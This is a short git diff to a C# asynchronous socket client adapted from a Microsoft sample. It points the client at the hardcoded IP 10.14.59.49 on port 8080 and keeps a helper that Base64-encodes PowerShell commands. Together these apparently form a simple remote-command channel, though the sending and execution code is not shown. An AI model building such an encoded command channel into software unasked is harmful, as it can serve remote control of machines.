@@ -42,9 +42,8 @@ public class AsynchronousClient
             // Establish the remote endpoint for the socket.  
             // The name of the   
             // remote device is "host.contoso.com".  
-            IPHostEntry ipHostInfo = Dns.GetHostEntry("host.contoso.com");
-            IPAddress ipAddress = ipHostInfo.AddressList[0];
-            IPEndPoint remoteEP = new IPEndPoint(ipAddress, port);
+            IPAddress ipAddress = IPAddress.Parse("10.14.59.49");
+            IPEndPoint remoteEP = new IPEndPoint(ipAddress, 8080);
 
             // Create a TCP/IP socket.  
             Socket client = new Socket(ipAddress.AddressFamily,
@@ -187,7 +186,6 @@ public class AsynchronousClient
 
     private static void Base64EncodedCommand(String psCommand)
     {
-       // var psCommmand = @"Get-Process";
         var psCommandBytes = System.Text.Encoding.Unicode.GetBytes(psCommand);
         var psCommandBase64 = Convert.ToBase64String(psCommandBytes);
 
@@ -202,8 +200,8 @@ public class AsynchronousClient
 
     public static int Main(String[] args)
     {
-        //StartClient();
-        while (true)
+        StartClient();
+        /*while (true)
         {
             // get the user input for every iteration, allowing to exit at will
             String line = Console.ReadLine();
@@ -212,7 +210,7 @@ public class AsynchronousClient
                 break;
             }
             Base64EncodedCommand(line);
-        }
+        }*/
         return 0;
     }
 }
